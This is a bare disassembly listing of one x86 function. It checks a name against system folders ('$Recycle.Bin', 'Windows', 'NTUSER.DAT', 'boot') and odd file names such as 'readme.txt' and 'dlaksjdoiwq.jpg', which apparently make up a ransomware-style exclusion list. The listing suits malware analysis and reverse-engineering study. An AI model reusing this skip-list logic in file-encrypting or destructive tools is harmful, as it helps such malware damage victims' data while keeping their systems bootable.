.text:002DEAA0 sub_2DEAA0 proc near                    ; CODE XREF: sub_2DD790+348↑p
.text:002DEAA0
.text:002DEAA0 Block= dword ptr -28h
.text:002DEAA0 var_18= dword ptr -18h
.text:002DEAA0 var_14= dword ptr -14h
.text:002DEAA0 var_10= dword ptr -10h
.text:002DEAA0 var_C= dword ptr -0Ch
.text:002DEAA0 var_4= dword ptr -4
.text:002DEAA0 arg_0= byte ptr  8
.text:002DEAA0 arg_4= dword ptr  0Ch
.text:002DEAA0
.text:002DEAA0 ; FUNCTION CHUNK AT .text:00332330 SIZE 00000058 BYTES
.text:002DEAA0 ; FUNCTION CHUNK AT .text:0033238D SIZE 00000027 BYTES
.text:002DEAA0
.text:002DEAA0 push    ebp
.text:002DEAA1 mov     ebp, esp
.text:002DEAA3 push    0FFFFFFFFh
.text:002DEAA5 push    offset SEH_40EAA0
.text:002DEAAA mov     eax, large fs:0
.text:002DEAB0 push    eax
.text:002DEAB1 sub     esp, 1Ch
.text:002DEAB4 mov     eax, ___security_cookie
.text:002DEAB9 xor     eax, ebp
.text:002DEABB mov     [ebp+var_10], eax
.text:002DEABE push    esi
.text:002DEABF push    eax
.text:002DEAC0 lea     eax, [ebp+var_C]
.text:002DEAC3 mov     large fs:0, eax
.text:002DEAC9 mov     [ebp+var_4], 0
.text:002DEAD0 xor     eax, eax
.text:002DEAD2 push    0Ch                             ; int
.text:002DEAD4 mov     [ebp+Block], 0
.text:002DEADB lea     ecx, [ebp+Block]                ; void *
.text:002DEADE mov     [ebp+var_18], 0
.text:002DEAE5 mov     [ebp+var_14], 0
.text:002DEAEC push    offset aRecycleBin              ; "$Recycle.Bin"
.text:002DEAF1 mov     [ebp+var_18], 0
.text:002DEAF8 mov     [ebp+var_14], 7
.text:002DEAFF mov     word ptr [ebp+Block], ax
.text:002DEB03 call    sub_2E3C90
.text:002DEB08 mov     byte ptr [ebp+var_4], 1
.text:002DEB0C lea     eax, [ebp+Block]
.text:002DEB0F push    0
.text:002DEB11 push    eax
.text:002DEB12 lea     ecx, [ebp+arg_0]
.text:002DEB15 call    sub_2E74A0
.text:002DEB1A mov     esi, eax
.text:002DEB1C mov     byte ptr [ebp+var_4], 0
.text:002DEB20 mov     ecx, [ebp+var_14]
.text:002DEB23 cmp     ecx, 8
.text:002DEB26 jb      short loc_2DEB5A
.text:002DEB28 mov     edx, [ebp+Block]
.text:002DEB2B lea     ecx, ds:2[ecx*2]
.text:002DEB32 mov     eax, edx
.text:002DEB34 cmp     ecx, 1000h
.text:002DEB3A jb      short loc_2DEB50
.text:002DEB3C mov     edx, [eax-4]
.text:002DEB3F add     ecx, 23h ; '#'
.text:002DEB42 sub     eax, edx
.text:002DEB44 add     eax, 0FFFFFFFCh
.text:002DEB47 cmp     eax, 1Fh
.text:002DEB4A ja      loc_2DEE2E
.text:002DEB50
.text:002DEB50 loc_2DEB50:                             ; CODE XREF: sub_2DEAA0+9A↑j
.text:002DEB50 push    ecx
.text:002DEB51 push    edx                             ; Block
.text:002DEB52 call    sub_30851F
.text:002DEB57 add     esp, 8
.text:002DEB5A
.text:002DEB5A loc_2DEB5A:                             ; CODE XREF: sub_2DEAA0+86↑j
.text:002DEB5A xor     eax, eax
.text:002DEB5C mov     [ebp+var_18], 0
.text:002DEB63 mov     [ebp+var_14], 7
.text:002DEB6A mov     word ptr [ebp+Block], ax
.text:002DEB6E cmp     esi, 0FFFFFFFFh
.text:002DEB71 jnz     loc_2DEDFE
.text:002DEB77 push    7                               ; int
.text:002DEB79 mov     [ebp+Block], eax
.text:002DEB7C lea     ecx, [ebp+Block]                ; void *
.text:002DEB7F mov     [ebp+var_18], eax
.text:002DEB82 mov     [ebp+var_14], eax
.text:002DEB85 push    offset aWindows                 ; "Windows"
.text:002DEB8A mov     [ebp+var_18], eax
.text:002DEB8D mov     [ebp+var_14], 7
.text:002DEB94 mov     word ptr [ebp+Block], ax
.text:002DEB98 call    sub_2E3C90
.text:002DEB9D mov     byte ptr [ebp+var_4], 2
.text:002DEBA1 lea     eax, [ebp+Block]
.text:002DEBA4 push    0
.text:002DEBA6 push    eax
.text:002DEBA7 lea     ecx, [ebp+arg_0]
.text:002DEBAA call    sub_2E74A0
.text:002DEBAF mov     esi, eax
.text:002DEBB1 mov     byte ptr [ebp+var_4], 0
.text:002DEBB5 mov     ecx, [ebp+var_14]
.text:002DEBB8 cmp     ecx, 8
.text:002DEBBB jb      short loc_2DEBEF
.text:002DEBBD mov     edx, [ebp+Block]
.text:002DEBC0 lea     ecx, ds:2[ecx*2]
.text:002DEBC7 mov     eax, edx
.text:002DEBC9 cmp     ecx, 1000h
.text:002DEBCF jb      short loc_2DEBE5
.text:002DEBD1 mov     edx, [eax-4]
.text:002DEBD4 add     ecx, 23h ; '#'
.text:002DEBD7 sub     eax, edx
.text:002DEBD9 add     eax, 0FFFFFFFCh
.text:002DEBDC cmp     eax, 1Fh
.text:002DEBDF ja      loc_2DEE2E
.text:002DEBE5
.text:002DEBE5 loc_2DEBE5:                             ; CODE XREF: sub_2DEAA0+12F↑j
.text:002DEBE5 push    ecx
.text:002DEBE6 push    edx                             ; Block
.text:002DEBE7 call    sub_30851F
.text:002DEBEC add     esp, 8
.text:002DEBEF
.text:002DEBEF loc_2DEBEF:                             ; CODE XREF: sub_2DEAA0+11B↑j
.text:002DEBEF xor     eax, eax
.text:002DEBF1 mov     [ebp+var_18], 0
.text:002DEBF8 mov     [ebp+var_14], 7
.text:002DEBFF mov     word ptr [ebp+Block], ax
.text:002DEC03 cmp     esi, 0FFFFFFFFh
.text:002DEC06 jnz     loc_2DEDFE
.text:002DEC0C push    0Eh                             ; int
.text:002DEC0E mov     [ebp+Block], eax
.text:002DEC11 lea     ecx, [ebp+Block]                ; void *
.text:002DEC14 mov     [ebp+var_18], eax
.text:002DEC17 mov     [ebp+var_14], eax
.text:002DEC1A push    offset aLocalSettings           ; "Local Settings"
.text:002DEC1F mov     [ebp+var_18], eax
.text:002DEC22 mov     [ebp+var_14], 7
.text:002DEC29 mov     word ptr [ebp+Block], ax
.text:002DEC2D call    sub_2E3C90
.text:002DEC32 mov     byte ptr [ebp+var_4], 3
.text:002DEC36 lea     eax, [ebp+Block]
.text:002DEC39 push    0
.text:002DEC3B push    eax
.text:002DEC3C lea     ecx, [ebp+arg_0]
.text:002DEC3F call    sub_2E74A0
.text:002DEC44 mov     esi, eax
.text:002DEC46 mov     byte ptr [ebp+var_4], 0
.text:002DEC4A mov     ecx, [ebp+var_14]
.text:002DEC4D cmp     ecx, 8
.text:002DEC50 jb      short loc_2DEC84
.text:002DEC52 mov     edx, [ebp+Block]
.text:002DEC55 lea     ecx, ds:2[ecx*2]
.text:002DEC5C mov     eax, edx
.text:002DEC5E cmp     ecx, 1000h
.text:002DEC64 jb      short loc_2DEC7A
.text:002DEC66 mov     edx, [eax-4]
.text:002DEC69 add     ecx, 23h ; '#'
.text:002DEC6C sub     eax, edx
.text:002DEC6E add     eax, 0FFFFFFFCh
.text:002DEC71 cmp     eax, 1Fh
.text:002DEC74 ja      loc_2DEE2E
.text:002DEC7A
.text:002DEC7A loc_2DEC7A:                             ; CODE XREF: sub_2DEAA0+1C4↑j
.text:002DEC7A push    ecx
.text:002DEC7B push    edx                             ; Block
.text:002DEC7C call    sub_30851F
.text:002DEC81 add     esp, 8
.text:002DEC84
.text:002DEC84 loc_2DEC84:                             ; CODE XREF: sub_2DEAA0+1B0↑j
.text:002DEC84 xor     eax, eax
.text:002DEC86 mov     [ebp+var_18], 0
.text:002DEC8D mov     [ebp+var_14], 7
.text:002DEC94 mov     word ptr [ebp+Block], ax
.text:002DEC98 cmp     esi, 0FFFFFFFFh
.text:002DEC9B jnz     loc_2DEDFE
.text:002DECA1 push    offset aApplicationDat          ; "Application Data"
.text:002DECA6 lea     ecx, [ebp+Block]
.text:002DECA9 call    sub_2D6D40
.text:002DECAE mov     byte ptr [ebp+var_4], 4
.text:002DECB2 lea     ecx, [ebp+arg_0]
.text:002DECB5 push    0
.text:002DECB7 push    eax
.text:002DECB8 call    sub_2E74A0
.text:002DECBD mov     esi, eax
.text:002DECBF mov     byte ptr [ebp+var_4], 0
.text:002DECC3 lea     ecx, [ebp+Block]
.text:002DECC6 call    sub_2E2C40
.text:002DECCB cmp     esi, 0FFFFFFFFh
.text:002DECCE jnz     loc_2DEDFE
.text:002DECD4 push    offset aOutTxt                  ; "OUT.txt"
.text:002DECD9 lea     ecx, [ebp+Block]
.text:002DECDC call    sub_2D6D40
.text:002DECE1 mov     byte ptr [ebp+var_4], 5
.text:002DECE5 lea     ecx, [ebp+arg_0]
.text:002DECE8 push    0
.text:002DECEA push    eax
.text:002DECEB call    sub_2E74A0
.text:002DECF0 mov     esi, eax
.text:002DECF2 mov     byte ptr [ebp+var_4], 0
.text:002DECF6 lea     ecx, [ebp+Block]
.text:002DECF9 call    sub_2E2C40
.text:002DECFE cmp     esi, 0FFFFFFFFh
.text:002DED01 jnz     loc_2DEDFE
.text:002DED07 push    offset aBoot                    ; "boot"
.text:002DED0C lea     ecx, [ebp+Block]
.text:002DED0F call    sub_2D6D40
.text:002DED14 mov     byte ptr [ebp+var_4], 6
.text:002DED18 lea     ecx, [ebp+arg_0]
.text:002DED1B push    0
.text:002DED1D push    eax
.text:002DED1E call    sub_2E74A0
.text:002DED23 mov     esi, eax
.text:002DED25 mov     byte ptr [ebp+var_4], 0
.text:002DED29 lea     ecx, [ebp+Block]
.text:002DED2C call    sub_2E2C40
.text:002DED31 cmp     esi, 0FFFFFFFFh
.text:002DED34 jnz     loc_2DEDFE
.text:002DED3A push    offset aReadmeTxt               ; "readme.txt"
.text:002DED3F lea     ecx, [ebp+Block]
.text:002DED42 call    sub_2D6D40
.text:002DED47 mov     byte ptr [ebp+var_4], 7
.text:002DED4B lea     ecx, [ebp+arg_0]
.text:002DED4E push    0
.text:002DED50 push    eax
.text:002DED51 call    sub_2E74A0
.text:002DED56 mov     esi, eax
.text:002DED58 mov     byte ptr [ebp+var_4], 0
.text:002DED5C lea     ecx, [ebp+Block]
.text:002DED5F call    sub_2E2C40
.text:002DED64 cmp     esi, 0FFFFFFFFh
.text:002DED67 jnz     loc_2DEDFE
.text:002DED6D push    offset aDlaksjdoiwqJpg          ; "dlaksjdoiwq.jpg"
.text:002DED72 lea     ecx, [ebp+Block]
.text:002DED75 call    sub_2D6D40
.text:002DED7A mov     byte ptr [ebp+var_4], 8
.text:002DED7E lea     ecx, [ebp+arg_0]
.text:002DED81 push    0
.text:002DED83 push    eax
.text:002DED84 call    sub_2E74A0
.text:002DED89 mov     esi, eax
.text:002DED8B mov     byte ptr [ebp+var_4], 0
.text:002DED8F lea     ecx, [ebp+Block]
.text:002DED92 call    sub_2E2C40
.text:002DED97 cmp     esi, 0FFFFFFFFh
.text:002DED9A jnz     short loc_2DEDFE
.text:002DED9C push    offset aNtuserDat               ; "NTUSER.DAT"
.text:002DEDA1 lea     ecx, [ebp+Block]
.text:002DEDA4 call    sub_2D6D40
.text:002DEDA9 mov     byte ptr [ebp+var_4], 9
.text:002DEDAD lea     ecx, [ebp+arg_0]
.text:002DEDB0 push    0
.text:002DEDB2 push    eax
.text:002DEDB3 call    sub_2E74A0
.text:002DEDB8 mov     esi, eax
.text:002DEDBA mov     byte ptr [ebp+var_4], 0
.text:002DEDBE lea     ecx, [ebp+Block]
.text:002DEDC1 call    sub_2E2C40
.text:002DEDC6 cmp     esi, 0FFFFFFFFh
.text:002DEDC9 jnz     short loc_2DEDFE
.text:002DEDCB push    offset aFkdjsadasdIco           ; "fkdjsadasd.ico"
.text:002DEDD0 lea     ecx, [ebp+Block]
.text:002DEDD3 call    sub_2D6D40
.text:002DEDD8 mov     byte ptr [ebp+var_4], 0Ah
.text:002DEDDC lea     ecx, [ebp+arg_0]
.text:002DEDDF push    0
.text:002DEDE1 push    eax
.text:002DEDE2 call    sub_2E74A0
.text:002DEDE7 mov     esi, eax
.text:002DEDE9 mov     byte ptr [ebp+var_4], 0
.text:002DEDED lea     ecx, [ebp+Block]
.text:002DEDF0 call    sub_2E2C40
.text:002DEDF5 cmp     esi, 0FFFFFFFFh
.text:002DEDF8 jnz     short loc_2DEDFE
.text:002DEDFA xor     esi, esi
.text:002DEDFC jmp     short loc_2DEE03
.text:002DEDFE ; ---------------------------------------------------------------------------
.text:002DEDFE
.text:002DEDFE loc_2DEDFE:                             ; CODE XREF: sub_2DEAA0+D1↑j
.text:002DEDFE                                         ; sub_2DEAA0+166↑j ...
.text:002DEDFE mov     esi, 1
.text:002DEE03
.text:002DEE03 loc_2DEE03:                             ; CODE XREF: sub_2DEAA0+35C↑j
.text:002DEE03 mov     [ebp+var_4], 0FFFFFFFFh
.text:002DEE0A lea     ecx, [ebp+arg_0]
.text:002DEE0D call    sub_2E2C40
.text:002DEE12 mov     eax, esi
.text:002DEE14 mov     ecx, [ebp+var_C]
.text:002DEE17 mov     large fs:0, ecx
.text:002DEE1E pop     ecx
.text:002DEE1F pop     esi
.text:002DEE20 mov     ecx, [ebp+var_10]
.text:002DEE23 xor     ecx, ebp                        ; StackCookie
.text:002DEE25 call    @__security_check_cookie@4      ; __security_check_cookie(x)
.text:002DEE2A mov     esp, ebp
.text:002DEE2C pop     ebp
.text:002DEE2D retn
.text:002DEE2E ; ---------------------------------------------------------------------------
.text:002DEE2E
.text:002DEE2E loc_2DEE2E:                             ; CODE XREF: sub_2DEAA0+AA↑j
.text:002DEE2E                                         ; sub_2DEAA0+13F↑j ...
.text:002DEE2E call    __invalid_parameter_noinfo_noreturn
.text:002DEE2E sub_2DEAA0 endp
.text:002DEE2E